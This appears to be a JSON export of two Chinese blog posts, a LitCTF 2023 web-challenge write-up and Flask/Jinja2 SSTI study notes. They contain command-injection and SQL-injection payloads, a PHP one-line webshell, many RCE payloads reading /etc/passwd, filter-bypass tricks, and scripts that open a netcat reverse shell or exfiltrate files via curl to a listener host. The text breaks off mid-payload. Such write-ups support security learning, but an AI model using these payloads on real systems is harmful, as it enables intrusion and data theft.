[{"id":"a1d695094e9aa3c3a7c4f837b1ce6fd6","title":"web[LitCTF2023] 郑州轻工业大学首届网络安全赛wp","content":"1.我Flag呢？\n2.导弹迷踪\n3.Follow me and hack me\n4.Ping前端验证绕过，我们输入127.0.0.1，符合前端验证的格式就行，然后点击ping按钮，尝试用burpsuite抓包,（当然，你也可以选择禁用js来解决）并将抓到的包进行我们需要的修改，”127.0.0.1|ls”，执行ls命令,可以执行,发现flag文件,直接cat，就可以读取\n5.PHP是世界上最好的语言！！题目提示flag位于根目录，直接去根目录找就行，然后直接cat就能拿到flag\n6.作业管理系统查看页面源代码，提示默认账户admin admin，登录进入作业管理系统，发现上传文件的功能，猜测存在文件上传漏洞，上传php一句话木马，\n&lt;?php @eval($_POST[&#39;shell&#39;]);?&gt;\n使用蚁剑连接，访问上传木马1.php，连接成功，发现根目录下存在flag文件，读取flag文件得到flag\n7.Vim yyds访问xxx&#x2F;.index.php.swp下载泄露的备份文件整理后的代码如下：\n&lt;?php\nerror_reporting(0);             \n$password &#x3D; &quot;Give_Me_Your_Flag&quot;;             \necho &quot;&lt;p&gt;can can need Vim &lt;&#x2F;p&gt;&quot;;             \n&#123;             \nif ($_POST[&#39;password&#39;] &#x3D;&#x3D;&#x3D; base64_encode($password)) \necho &quot;&lt;p&gt;Oh You got my password!&lt;&#x2F;p&gt;&quot;;             \neval(system($_POST[&#39;cmd&#39;]));                 \n&#125;                 \n?&gt;             \n按照要求post提交password和cmd，在根目录发现flag\n8.这是什么？SQL ！注一下 ！1)))))) or 1&#x3D;1#\n\n然后,恭喜你，就得到了一个假的flag。\n1)))))) order by 2 #\n\n输入3返回值为0，\n1)))))) union select 1,group_concat(schema_name) from information_schema.schemata#\n爆库：information_schema,mysql,ctftraining,performance_schema,test,ctf\n1)))))) union select 1,group_concat(table_name)from information_schema.tables where table_schema&#x3D;&quot;ctftraining&quot;#\n爆表：flag,news,users\n1)))))) union select 1,group_concat(column_name)from information_schema.columns where table_name&#x3D;&quot;flag&quot;#\n爆列名：flag\n1)))))) union select 1,group_concat(flag) from ctftraining.flag#\n\n9.Http pro max plus\n可恶，加了个xff。被嘲讽了。不过没关系，还有很多办法。\nclient-ip: 127.0.0.1\n\n\nemmm，也许还有更简单粗暴的方法，但是。\nReferer:pornhub.com\n\n\nUser-Agent: Chrome\n\n\n代理的请求头：\n\nHTTP请求头大全,HTTP头信息包括通用头、请求头、响应头和实体头四个部分：https://stackoverflow.org.cn/httpheader/\nvia: Clash.win\n\n\n\n三个链接我帮大家都看过了，没有好康的，但是拿到flag就不亏。\n\n10.1zjs\n是f1ag，不是flag，慢慢找吧，js代码有点多。然后访问&#x2F;&#x66;&#x40;&#107;&#51;&#x66;&#49;&#97;&#103;&#46;&#112;&#104;&#112;，把代码全部复制到控制台回车。js fuck：\n11.就当无事发生社工题，给了链接 https://ProbiusOfficial.github.io ，打开后发现是探姬的博客，翻到最底下hexo，搭建过博客就想到github（唔，加上背景图片博客很好看，但是我截图的时候图片没加载出来）\n\n利用github搭建的hexo博客有固定格式：https://github.com/ProbiusOfficial/ProbiusOfficial.github.io/\n\n历史记录有删掉的版本，不出意外就在这里面就有flag。\n\n12.Flag点击就送！flask-session-cookie-manager工具下载：https://github.com/noraj/flask-session-cookie-manager\nusage: flask_session_cookie_manager&#123;2,3&#125;.py encode [-h] -s &lt;string&gt; -t &lt;string&gt;\n\noptional arguments:\n  -h, --help            show this help message and exit\n  -s &lt;string&gt;, --secret-key &lt;string&gt;\n                        Secret key\n  -t &lt;string&gt;, --cookie-structure &lt;string&gt;\n                        Session cookie structure\n\n\n13.彩蛋彩蛋分布于  Follow me and hack me  作业管理系统 狠狠的注入 四个题目 中\n\n1.我Flag呢:在script.min.js可以找到。\n\nLitCTF&#123;First_t0_The_k3y! (1&#x2F;?) \n\n2.作业管理系统：\n_S0_ne3t? (2&#x2F;?)\n\n3.Follow me and hack me:\n提示说有备份文件很好吃。\n备份文件常见的后缀名:\n.rar\n.zip\n.7z\n.tar\n.tar.gz\n.bak\n常见的网站源码备份文件名：\nweb\nwebsite\nbackup\nback\nwww\nwwwroot\ntemp\n\nwww.zip，手动尝试吧，脚本没跑出来，全是200。\n\n_R3ady_Pl4yer_000ne_ (3&#x2F;?)\n\n4.狠狠的注入:\nF1rst_to_Th3_eggggggggg!&#125; (4&#x2F;4)\n\nall.四个合在一起得到彩蛋的完整flag：\nNSSCTF&#123;First_t0_The_k3y!_S0_ne3t?_R3ady_Pl4yer_000ne_F1rst_to_Th3_eggggggggg!&#125;","slug":"Litctf 2023","date":"2023-05-16T15:45:17.000Z","categories_index":"文章","tags_index":"LitCTF,wp","author_index":"南瓜の无名"},{"id":"3137c2b6b2ca0e39e8c62639d966b498","title":"ssti模板注入学习笔记-漏洞原理及漏洞应用","content":"ssti模板注入flask漏洞-代码不严谨可能造成任意文件读取和RCE远程控制控制后台系统\n漏洞成因：~~ 渲染模板时，没有严格控制对用户的输入~~ 使用了危险的模板，导致用户可以和flask程序进行交互\nflask是基于python开发的一种web框架，那么也就意味着如果用户可以和flask进行交互的话，就可以执行python的代码，比如eval，system，file等等之类的函数。\nfrom flask import Flask,request,render_template_string\napp &#x3D; Flask(__name__)\n@app.route(&#39;&#x2F;&#39;, methods&#x3D;[&#39;GET&#39;])\ndef index():\n    str &#x3D; request.args.get(&#39;ben&#39;)\n    html_str &#x3D; &#39;&#39;&#39;\n    &lt;html&gt;\n    &lt;head&gt;&lt;&#x2F;head&gt;\n    &lt;body&gt;&#123; &#123;str&#125; &#125;&lt;&#x2F;body&gt;        \n    &lt;&#x2F;html&gt;\n    &#39;&#39;&#39;\n    #str是被&#123; &#123;&#125; &#125;包括起来的，会被预先渲染转义，然后才会输出，不会被渲染执行；\n    return render_template_string(html_str,str&#x3D;str)\nif __name__&#x3D;&#x3D;&#39;__main__&#39;:\n    app.debug&#x3D;True\n    app.run(&#39;127.0.0.1&#39;.&#39;8888&#39;)\n    #&#123; &#123;7*7&#125; &#125;不会执行\n\nfrom importlib.resources import contents\nimport time\nfrom flask import Flask,request,render_template_string\napp &#x3D; Flask(__name__)\n@app.route(&#39;&#x2F;&#39;, methods&#x3D;[&#39;GET&#39;])\ndef index():\n    str &#x3D; request.args.get(&#39;ben&#39;)       #&#123;&#125;里面可以定义任何参数\n    html_str &#x3D; &#39;&#39;&#39;\n    &lt;html&gt;\n    &lt;head&gt;&lt;&#x2F;head&gt;\n    &lt;body&gt;&#123;0&#125;&lt;&#x2F;body&gt;    \n    &lt;&#x2F;html&gt;\n    &#39;&#39;&#39;.format(str)     #str值通过format()函数填充到body中间\n    return render_template_string(html_str)\n    #return render_template_string会把&#123;&#125;内的字符串当成代码指令\nif __name__&#x3D;&#x3D;&#39;__main__&#39;:\n    app.debug&#x3D;True\n    app.run(&#39;127.0.0.1&#39;.&#39;8888&#39;)\n    #&#123; &#123;7*7&#125; &#125;会被当成指令执行 \n\n可以利用魔术方法去验证模板注入\n127.0.0.1:8888&#x2F;?a&#x3D;&#123; &#123;&quot;.__class__.__mro__&#125; &#125;\n\n服务器端模板注入实际上也是一种注入漏洞。\n判断模板类型$&#123;7*7&#125;成功：\na&#123;*comment*&#125;b           输出ab -&gt; Smarty\n$&#123;&quot;z&quot;.join(&quot;ab&quot;)&#125;       输出azb -&gt; Mako or ???\n\n$&#123;7*7&#125;失败：\n&#123; &#123;7*7&#125; &#125; and &#123; &#123;7*&#39;7&#125;&#39;&#125;   输出49 -&gt; Jinja2 or Twig or ???\n\nssti常用注入模板1.文件读取2.内建函数eval执行命令3.os模块执行命令4.importlib类执行命令5.linecache函数执行命令6.subprocess.Popen类执行命令\n1.文件读取#查找子类 _frozen_importlib_external.FileLoader\n&lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;\n#FileLoader的利用\n&#123; &#123;&#39;&#39;.__class__.__mro__[1].__subclasses__()[79][&quot;get_data&quot;](0,&quot;&#x2F;etc&#x2F;passed&quot;)&#125; &#125;\n#读取配置文件下的FLAG\n&#123; &#123;config&#125; &#125;\n&#123; &#123;url_for.__globals__[&#39;current_app&#39;].config.FLAG&#125; &#125;\n&#123; &#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config.FLAG&#125; &#125;\n\n~python脚本编写(POST提交”name”的值，通过for循环查找所需字符串)\nimport requests\nurl &#x3D; input(&#39;请输入URL链接&#39;)\nfor i in range(500)\n    data &#x3D; &#123;&quot;name&quot;:&quot;&#123; &#123;().__class__.__base__.__subclasses__()[&quot;+str(i)+&quot;]&#125; &#125;&quot;&#125;\n    #data &#x3D; &#123;&quot;name&quot;:&quot;&#123; &#123;().__class__.__mro__[1].__subclasses__()[&quot;+str(i)+&quot;]&#125; &#125;&quot;&#125;\n    try:\n        response &#x3D; requests.post(url,data&#x3D;data)\n        #print(response.text)\n        if response.status_code &#x3D;&#x3D; 200:\n            if &#39;_frozen_importlib_external.FileLoader&#39; in response.text:\n                print(i)\n    except:\n        pass \n\n2.内建函数eval执行命令内建函数：python在执行脚本时自动加载的模块\nimport requests\nurl &#x3D; input(&#39;请输入URL链接&#39;)\nfor i in range(500):\n    data&#x3D;&#123;&quot;name&quot;:\n    &quot;&#123; &#123;().__class__.__base__.__subclasses__()[&quot;+str(i)+&quot;].__init__.__globals__[&#39;__builtins__&#39;]&#125; &#125;&quot;&#125;\n    try:\n        response &#x3D; requests.post(url,data&#x3D;data)\n        #print(response.text)\n        if response.status_code &#x3D;&#x3D; 200:\n            if &#39;eval&#39; in response.text:\n                print(i)\n    except:\n        pass\n\npayload:\n&#123; &#123;&#39;&#39;.__class__.__bases__[0].__subclasses__()[65].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;cat .&#x2F;etc&#x2F;passwd&quot;).read()&#39;)&#125; &#125;\n\n__builtins__提供对python的所有”内置“标识符的直接访问\neval()计算字符串表达式的值\n__import__加载os模块\npopen()执行一个shell以运行命令来开启一个进程，执行cat &#x2F;etc&#x2F;passwd\n(system没有回显)\n\n3.os模块执行命令~~在其他函数中直接调用os模块\n#通过config，调用os\n&#123; &#123;config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;whoami&#39;).read()&#125; &#125;\n\n#通过url_for，调用os\n&#123; &#123;url_for.__globals__.os.popen(&#39;whoami&#39;).read()&#125; &#125;\n\n~~在已经加载好os模块的子类里直接调用os模块\n&#123; &#123;&#39;&#39;.__class__.__bases__[0].__subclasses__()[199].__init__.__globals__[&#39;os&#39;].popen(&quot;ls -l &#x2F;opt&quot;).read()&#125; &#125;\n&quot;&quot;&quot;\n&#39;&#39;.__class__ 返回空字符串字符串类型的类，也就是 str 类。\nstr.__bases__[0] 返回 str 基类对象。\nstr.__bases__[0].__subclasses__() 将返回所有从 str 基类继承而来的子类列表。\n[199] 表示选择该列表中的第 200 个子类，因为在 Python 中，许多内置或库（如 os、sys 等）都是基于类实现的，而拥有相同父类的类按照继承顺序排序在该列表中。\n.__init__ 返回所选子类的初始化方法。\n.__globals__[&#39;os&#39;] 返回一个包含 os 模块的全局命名空间字典。\n.popen(&quot;ls -l &#x2F;opt&quot;) 在该全局命名空间中调用 popen() 方法，并执行一个列出位于 &#x2F;opt 目录下的所有文件的命令。\n.read() 读取命令所输出的数据并返回给模板。\n&quot;&quot;&quot;\n\n其他一些payload的举例\n&#123; &#123;self.__dict__._TemplateReference__context.keys()&#125; &#125;\n&#123; &#123;lipsum.__globals__.os.popen(&#39;cat &#x2F;etc&#x2F;passwd&#39;).read()&#125; &#125;\n\n__base__和__bases__[ ]的区别\n__base__ 属性只能获取单一的父类，而 __bases__[] 属性可以获取到所有的直接父类。\n\n4.importlib类执行命令可以加载第三方库，使用load_module加载ospython脚本查找_frozen_importlib.BuiltinImporter\nimport requests\nurl &#x3D; input(&#39;请输入URL链接:&#39;)\nfor i in range(500):\n    data &#x3D; &#123;&quot;name&quot;:\n    &quot;&#123; &#123;().__class__.__bases__[0].__subclasses__()[&quot;+str(i)+&quot;]&#125; &#125;&quot;&#125;\n    try:\n        response &#x3D; requests.post(url,data&#x3D;data)\n        if response.status_code &#x3D;&#x3D; 200:\n            if &#39;_frozen_importlib.BuiltinImporter&#39; in response.text:\n                print(i)\n    except:\n        pass\n\npayload:\n&#123; &#123;[].__class__.__base__.__subclasses__()[69][&quot;load_module&quot;](&quot;os&quot;)[&quot;popen&quot;](&quot;ls -l &#x2F;opt&quot;).read()&#125; &#125;\n\n5.linecache函数执行命令linecache函数可用于读取任意一个文件的某一行，而这个函数中也引入了os模块，所以我们也可以利用linecache函数如执行命令。python脚本查找linecache\nimport requests\nurl &#x3D; input(&#39;请输入URL链接:&#39;)\nfor i in range(500):\n    data &#x3D; &#123;&quot;name&quot;:\n    &quot;&#123; &#123;().__class__.__bases__[0].__subclasses__()[&quot;+str(i)+&quot;].__init__.__globals__&#125; &#125;&quot;&#125;\n    try:\n        response &#x3D; requests.post(url,data&#x3D;data)\n        if response.status_code &#x3D;&#x3D; 200:\n            if &#39;linecache&#39; in response.text:\n                print(i)\n    except:\n        pass\n\npayload:\n&#123; &#123;[].__class__.__base__.__subclasses__()[191].__init__.__globals__[&#39;linecache&#39;][&#39;os&#39;].popen(&quot;ls -l &#x2F;&quot;).read()&#125; &#125;\n&#123; &#123;[].__class__.__base__.__subclasses__()[191].__init__.__globals__.linecache.os.popen(&quot;ls -l &#x2F;&quot;).read()&#125; &#125;\n\n6.subprocess.Popen类执行命令从python2.4版本开始，可以用subprocess这个模块来产生子进程，并连接到子进程的标准输入&#x2F;输出&#x2F;错误中去，还可以得到子进程的返回值。subprocess意在替代其他几个老的模块或者函数，比如：os.system,os.popen等函数。python脚本查找subprocess.Popen:\nimport requests\nurl &#x3D; input(&#39;请输入URL链接:&#39;)\nfor i in range(500):\n    data &#x3D; &#123;&quot;name&quot;:\n    &quot;&#123; &#123;().__class__.__bases__[0].__subclasses__()[&quot;+str(i)+&quot;]&#125; &#125;&quot;&#125;\n    try:\n        response &#x3D; requests.post(url,data&#x3D;data)\n        if response.status_code &#x3D;&#x3D; 200:\n            if &#39;subprocess.Popen&#39; in response.text:\n                print(i)\n    except:\n        pass\n\npayload:\n&#123; &#123;[].__class__.__base__.__subclasses__()[200](&#39;ls &#x2F;&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125; &#125;\n&quot;&quot;&quot;\n[] 创建一个空列表。\n&#39;&#39;.__class__ 返回空字符串字符串类型的类，也就是 str 类。\nstr.__base__ 返回 str 基类对象。\nstr.__base__.__subclasses__() 将返回所有从 str 基类继承而来的子类列表。\n[200] 表示选择该列表中的第 201 个子类，因为在 Python 中，许多内置或到处的库（如 os、sys 等）都是基于类实现的，并且继承关系可能会随着版本更新而变化。\n调用所选类的初始化方法，并传递给它要执行的系统命令和参数。请注意，这里将参数传递给 shell&#x3D;True 会让命令在 shell 环境下运行，这可以使用户更容易地传递一些组合命令。\ncommunicate() 方法发起与执行命令的子进程的双向通信，并等待命令完成。我们调用此方法以获取命令输出和错误结果。\ncommunicate()[0] 返回命令输出，因为在这个例子中无需关心可能存在的错误结果。\nstrip() 去除输出的最前面之后的空白字符。\n&quot;&quot;&quot;\n\n总结\n绕过过滤1.绕过过滤双大括号{ % % }是属于flask的控制语句，且以{ % end… % }结尾，可以通过在控制语句定义变量或者写循环，判断。示例app.py:\nfrom flask import Flask,rendre_template\napp &#x3D; Flask(__name__)\n\n@app.route(&#39;&#x2F;&#39;)\ndef show1():\n    girls &#x3D; [&#39;小红&#39;,&#39;小蓝&#39;，&#39;小粉&#39;,&#39;小黄&#39;,&#39;小绿&#39;]\n    return render_template(&#39;index.html&#39;,girls&#x3D;girls)\n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    app.run()\n\n示例index.html:\n&lt;!DOCTYPE html&gt;\n&lt;html lang&#x3D;&quot;en&quot;&gt;\n&lt;head&gt;\n    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;\n    &lt;title&gt;Document&lt;&#x2F;title&gt;\n    &lt;style&gt;\n            .a&#123;\n                color:red;\n                font_weight:bold;\n            &#125;\n    &lt;&#x2F;style&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n&lt;ul&gt;\n    &#123; % for girl in girls % &#125;\n        &#123; % if girl|length &gt;&#x3D;3 % &#125;\n            &lt;li class&#x3D;&quot;a&quot;&gt;&#123; &#123;girl&#125; &#125;&lt;&#x2F;li&gt;\n        &#123; % else % &#125;\n            &lt;li&gt;&#123; &#123;girl&#125; &#125;&lt;&#x2F;li&gt;\n        &#123; % endif % &#125;\n    &#123; % endfor % &#125;\n&lt;&#x2F;ul&gt;\n&#123; % set name&#x3D;&#39;a&#39; % &#125;\n&#123; &#123;name&#125; &#125;\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n\n解题思路\n#判断&#123; &#123;&#125; &#125;被过滤\n#尝试&#123; % % &#125;\n&#123; % if 2&gt;1 % &#125;name&#123; % endif % &#125;\n&#123; % if &#39;&#39;.__class__ % &#125;name&#123; % endif % &#125;\n#有回显name说明&#39;&#39;.__class__有内容\n&#123; % if &quot;&quot;.__class__.__base__.__subclasses__()[&#39;+str(i)+&#39;].__init__.__globals__[&quot;popen&quot;](&quot;cat &#x2F;etc&#x2F;passwd&quot;).read() % &#125;name&#123; % endif % &#125;\n#如果有回显name则说明命令正常执行\n构造脚本查询可使用“popen”的子类编号\nimport requests\nurl &#x3D; input(&quot; 请输入url链接 &quot;)\nfor i in range(300):\n    try:\n        data &#x3D; &#123;&quot;code&quot;:&#39;&#123; % if &quot;&quot;.__class__.__base__.__subclasses()[&#39;+str(i)+&#39;].__init__.__globals__[&quot;popen&quot;](&quot;cat &#x2F;etc&#x2F;passwd&quot;).read() % &#125;name&#123; % endif % &#125;&#39;&#125;\n        response &#x3D; requests.post(url,data&#x3D;data)\n        if response.status_code &#x3D;&#x3D; 200:\n            if &quot;name&quot; in response.text:\n                print(i,&quot;--&gt;&quot;,data)  \n                break\n    except:\n        pass\n\npayload：\n&#123; % print(&quot;&quot;.__class__.__base__.__subclasses()[&#39;+str(i)+&#39;].__init__.__globals__[&quot;popen&quot;](&quot;cat &#x2F;etc&#x2F;passwd&quot;).read()) % &#125;\n\n2.无回显ssti模板注入~ ssti盲注思路：\n(1)反弹shell\n通过rce反弹一个shell出来绕过\n(2)带外注入\n通过requestbin或dnslog的方法将信息传到外界\n(3)纯盲注\n\n反弹shell（没有回显，直接使用脚本批量执行希望执行的命令）\nimport requests\n\nurl &#x3D; input(&quot;请输入目标URL地址&quot;)\n\nfor i in range(300):\n    try:\n        data &#x3D; &#123;&quot;code&quot;:&#39;&#123; &#123;&quot;&quot;.__class__.__base__.__subclasses__()[&#39;+str(i)+&#39;].__init__.__globals__[&quot;popen&quot;](&quot;netcat 监听主机 端口 -e &#x2F;bin&#x2F;bash&quot;).read()&#125; &#125;&#39;&#125;\n        response &#x3D; requests.post(url,data&#x3D;data)\n    except:\n        pass\n#监听主机收到反弹shell进入对方命令行界面\n\n带外注入此处使用wget方法来带外想要知道的内容，也可以使用dnslog或者nc。\nimport requests\n\nurl &#x3D; input(&quot;请输入目标URL地址&quot;)\n\nfor i in range(300):\n    try:\n        data &#x3D; &#123;&quot;code&quot;:&#39;&#123; &#123;&quot;&quot;.__class__.__base__.__subclasses__()[&#39;+str(i)+&#39;].__init__.__globals__[&quot;popen&quot;](&quot;curl http:&#x2F;&#x2F;监听主机ip&#x2F;&#96;cat &#x2F;etc&#x2F;passwd&#96;&quot;).read()&#125; &#125;&#39;&#125;            \n        #反引号命令执行\n        response &#x3D; requests.post(url,data&#x3D;data)\n    except:\n        pass\n#同时kali开启一个python http监听  #python3 -m http.server 80\n#cat没办法换行，只能显示第一行（需要配合换行命令来显示其他内容）\n\n纯盲注\n&#96;&#96;&#96;\n\n##### 3.getitem绕过中括号过滤\n&#96;__getitem__()&#96;是python的一个魔术方法，\n对字典使用时，传入字符串，返回字典相应键所对应的值；\n对列表使用时，传入整数，返回列表对应索引的值；\n\n&#96;&#96;&#96;python\nclass test():\n    def __init__(self):\n        self.a&#x3D;&#123;\n            &#39;1&#39;:&#39;小红&#39;,\n            &#39;2&#39;:&#39;小绿&#39;,\n            &#39;3&#39;:&#39;小黄&#39;\n            &#125;\n    def getitem(self,key):\n        b &#x3D; self.a[key]\n        return b\nt &#x3D; test()\nprint(t.getitem(&#39;2&#39;))\nclass test():\n    def __init__(self):\n        self.a&#x3D;&#123;\n            &#39;1&#39;:&#39;小红&#39;,\n            &#39;2&#39;:&#39;小绿&#39;,\n            &#39;3&#39;:&#39;小黄&#39;\n            &#125;\n    def __getitem__(self,key):\n        b &#x3D; self.a[key]\n        return b\nt &#x3D; test()\nprint(t[&#39;2&#39;])           #实体对象[&#39;key&#39;] 系统会自动调用__getitem__方法\n\n可以用来绕过[]过滤\n&#123; &#123;&#39;&#39;.__ckass__.__base__.__subclasses__().__getitem__(&#39;+ str(i) +&#39;)&#125; &#125;\n\n使用__getitem__()构造payload:\nimport requests\nurl &#x3D; input(&#39;请输入URL链接:&#39;)\nfor i in range(500):\n    data &#x3D; &#123;&quot;code&quot;:\n    &#39;&#123; &#123;&quot;&quot;.__class__.__base__.__subclasses__().__getitem__(&#39;+str(i)+&#39;)&#125; &#125;&#39;&#125;\n    try:\n        response &#x3D; requests.post(url,data&#x3D;data)\n        if response.status_code &#x3D;&#x3D; 200:\n            if &#39;_wrap_close&#39; in response.text:\n                print(i,&quot;---&gt;&quot;,response.text)\n                break\n    except:\n        pass\npayload:\n&#123; &#123;&#39;&#39;.__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__.__getitem__(&#39;popen&#39;)(&#39;cat &#x2F;etc&#x2F;passed&#39;).read()&#125; &#125;\n\n4.request绕过单双引号过滤request在flask中可以访问基于HTTP请求传递的所有信息此request并非python函数，而是在flask内部的函数\nrequest.args.key    获取get传入的key的值\nrequest.values.x1   所有参数 \nrequest.cookies     获取cookies传入参数 \nrequest.headers     获取请求头请求参数 \nrequest.form.key    获取post传入参数\n（Content-Type：applicaation／x-www-form-urlencoded或multipart／form-data） request.data        获取post传入参数（Content-Type：a／b） \nrequest.json        获取post传入json参数（Content-Type：application／json） \n\napp.py\nfrom flask import Flask, render template, request\n\napp&#x3D;Flask(__name__)\n\n@app.route(&#39;&#x2F;&#39;,methods &#x3D; [&#39;POST&#39;,&#39;GET&#39;]) \ndef show1():\n    return render_template(&#39;index.html&#39;) \n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    app.run(host&#x3D;&#39;0.0.0.0&#39;) \n\nindex.html\n&lt;html lang&#x3D;&quot;en&quot;&gt; \n&lt;head&gt;\n&lt;meta charset&#x3D;&quot;UTF-8&quot;&gt; \n&lt;title&gt;过滤器的使用&lt;&#x2F;title&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n&lt;br&gt;\n获取get提交数据： &#123; &#123;request.args.k1&#125; &#125;\n&lt;br&gt;\n获取post提交数据：&#123; &#123;request.form.k2&#125; &#125;\n&lt;br&gt;\n获取cookie提交数据：&#123; &#123;request.cookies.k3&#125; &#125;\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n在构造payload时大多会用到单双引号，可以通过构造带 参数的url，配合request获取参数的内容来组成想要提交的指令，从而绕过单双引号的使用。\n#POST提交payload\n&#123; &#123;().__class__.__base__.__subclasses__()[117].__init__.__globals__[&#39;popen&#39;](&#39;cat &#x2F;etc&#x2F;passwd&#39;).read()&#125; &#125;\n&#123; &#123;().__class__.__base__.__subclasses__()[117].__init__.__globals__[request.form.k1](requests.form.k2).read()&#125; &#125;&amp;k1&#x3D;popen&amp;k2&#x3D;cat &#x2F;etc&#x2F;passwd\n#cookie提交payload\n&#123; &#123;().__class__.__base__.__subclasses__()[117].__init__.__globals__[&#39;popen&#39;](&#39;cat &#x2F;etc&#x2F;passwd&#39;).read()&#125; &#125;\n&#123; &#123;().__class__.__base__.__subclasses__()[117].__init__.__globals__[request.cookies.k1](request.cookies.k2).read()&#125; &#125;\n#Cookie:k1&#x3D;popen;k2&#x3D;cat &#x2F;etc&#x2F;passwd\n\n5.过滤器绕过下划线过滤过滤器1.过滤器通过管道符号（|）与变量连接，并且在括号中可能有可选的参数。2.可以链接到多个过滤器，一个过滤器的输出将应用与下一个过滤器。\napp.pyindex.html\n&#123; &#123;()|attr(&#39;__class__&#39;)|attr(&#39;__base__&#39;)&#125; &#125;\n#attr绕过下划线_过滤\n&#39;&#39;&#39;\n1.使用reques方法\nGET请求：URL&#x2F;?cla&#x3D;__class__\nPOST提交：code&#x3D;&#123; &#123;()|attr(request.args.cla)&#125; &#125;\n&#39;&#39;&#39;\n#&#123; &#123;&#39;&#39;.__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__.__getitem__(&#39;popen&#39;)(&#39;cat &#x2F;etc&#x2F;passed&#39;).read()&#125; &#125;\n#例子：\n#GET提交：URL&#x2F;?cla&#x3D;__class__&amp;bas&#x3D;__base__&amp;sub&#x3D;__subclasses__&amp;ini&#x3D;__init__&amp;glo&#x3D;__globals__&amp;gei&#x3D;__getitem__\n#POST提交：&#123; &#123;&#39;&#39;|attr(request.args.cla)|attr(request.args.sub)()|attr(request.args.gei)(117)|attr(request.args.ini)|attr(request.args.glo)|attr(request.args.gei)(&#39;popen&#39;)(&#39;cat &#x2F;etc&#x2F;passwd&#39;)|attr(&#39;read&#39;)()&#125; &#125;\n&#39;&#39;&#39;\n2.使用unicode编码\n3.使用16位编码\n4.base64编码\n5.格式化字符串      %c %95即下划线\n&#39;&#39;&#39;\n\n6.中括号绕过点过滤点’.’被过滤1.用中括号代替点2.attr()绕过\n7.绕过关键字过滤过滤了”class””arg””from””value””int””global”等关键字\n以&quot;__class__&quot;为例\n1.字符编码\n2.最简单的拼接“+”：&#39;__cl&#39;+&#39;ass__&#39;\n3.使用Jinjia2中的&quot;~&quot;进行拼接：&#123; %set a&#x3D;&quot;__cla&quot;% &#125;&#123; %set b &#x3D; &quot;ss__&quot;% &#125;&#123; &#123;()[a~b]&#125; &#125;\n4.利用过滤器（reverse反转，replace替换，join拼接等）：\n&#123; %set a&#x3D;&quot;__ssalc__&quot;|reverse% &#125;&#123; &#123;()[a]&#125; &#125;\n5.利用python的char():\n&#123; %set chr&#x3D;url_for.__globals__[&#39;__builtins__&#39;].chr% &#125;&#123; &#123;&quot;&quot;[chr(95)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(97)%2bchr(115)%2bchr(95)%2bchr(95)]&#125; &#125;\n#为了避免字符串被过滤&#x2F;转义，基于chr()函数来生成整数编码的字符，并将其拼接成字符串。例如，在上面的代码中，chr(95)会生成一个下划线字符 &quot;_&quot; 的ASCII编码，chr(99)则对应着 &quot;c&quot; 字符，依次类推。\n\n\n8.length过滤器绕过数字过滤\n9.获取config文件有些flag可能在config文件中如果没有过滤，直接{ {config} }就能打开。&#x2F;&#x2F;姿势集里面有相关说明\n**flask内置函数**\nlipsum 可加载第三方库\nurl_for 可返回url路径\n#url_for:一个可以根据视图函数名或端点名称生成相应 URL 的函数。通过这个函数，我们可以在不硬编码URL的情况下引用不同的视图函数或端点，并构建出正确的URL路由。\nget_flashed_message 可获取消息\n#get_flashed_messages：一个在重定向期间获取Flash消息的函数。Flash消息通常用于在请求之间存储临时信息，比如表单提交后显示一个成功或失败的消息。\n**flask内置对象**\ncycler：一个轻量级的循环迭代器，可以用于生成一系列重复的值。\njoiner：一个字符串连接器，可以将多个字符串连接成一个字符串。\nnamespace：一个命名空间对象，可以在程序中组织变量和函数，避免命名冲突。\nconfig：一个配置管理器对象，可以读取和写入程序的配置文件参数。\nrequest：一个用于发送 HTTP 请求的对象，通常用于从网络上获取数据。\nsession：一个用于存储用户会话信息的对象，通常用于在Web应用程序中跟踪用户状态。\n可利用已加载内置函数或对象寻找被过滤字符串可利用内置函数调用current_app模块进而查看配置文件\ncurrent_app\n调用current_app相当于调用flask\n&#123; &#123;url_for.__globals__[&#39;current_app&#39;].config&#125; &#125;\n#当在 Flask 模板中调用 &#123; &#123; url_for.__globals__[&#39;current_app&#39;].config &#125; &#125; 时，实际上是通过获取 url_for 对应的全局命名空间中的 current_app 对象，进而获取当前应用程序的配置信息并输出。\n&#123; &#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config&#125; &#125;\n10.混合过滤dict()和join\ndict(): #用来创建一个字典\njoin： #将一个序列中的参数值拼接成字符串\n&#123; %set a&#x3D;dict(nihao&#x3D;1)% &#125;&#123; &#123;a&#125; &#125;   \n#创建字典a，键名nihao，键值1\n&#123; %set a&#x3D;dict(__cla&#x3D;1,ss__&#x3D;2)|join% &#125;&#123; &#123;a&#125; &#125;  \n#创建字典a，join把参数值拼接成字符串\n获取符号\n利用flask内置函数和对象获取符号\n&#123; % set hao &#x3D; (&#123;&#125;|select()|string()) % &#125;&#123; &#123;hao&#125; &#125;\n&#123; % set hao &#x3D; (lipsum|string) % &#125;&#123; &#123;hao&#125; &#125;\n#获取下划线\n&#123; % set hao &#x3D; (self|string()) % &#125;&#123; &#123;hao&#125; &#125;\n#获取空格\n&#123; % set hao &#x3D; (self|string|urlencode) % &#125;&#123; &#123;hao&#125; &#125;\n#获取百分号\n&#123; % set hao &#x3D; (app.__doc__|string) % &#125;&#123; &#123;hao&#125; &#125;\n···类似的payload有很多\n在后面添加|list,然后根据返回的结果，通过hao[]去获取你需要的符号\n具体可以看示例2里面的payload\n\n示例1：WAF过滤  &#39;,&quot;,&#39;+&#39;,&#39;request&#39;,&#39;.&#39;,&#39;[&#39;,&#39;]&#39;\npayload原型:&#123; 